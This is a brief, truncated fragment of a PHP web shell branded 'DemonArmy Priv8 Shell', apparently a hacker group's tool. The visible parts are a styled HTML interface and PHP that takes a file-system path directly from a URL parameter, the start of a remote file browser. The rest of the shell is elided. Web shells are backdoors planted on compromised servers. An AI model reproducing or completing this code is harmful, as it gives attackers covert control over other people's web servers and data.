...
<title>DemonArmy Priv8 Shell</title>
<center>
<img src="https://i.imgur.com/STpfZR9.png" style="opacity:0.5; width:150px; height:150px";></center>
<style>
body{
font-family: "Kalam";
...
<body>
<h1><center><font color="red"><font color="white">-=</font>[DemonArmyPRIV]<font color="white">=-</font></font><br>
			
			</center></h1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><font color="">Path :</font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
...
echo '<font color="red" size="2px"><center><br/><b> <font color="blue">DemonArmy</a></center></font>
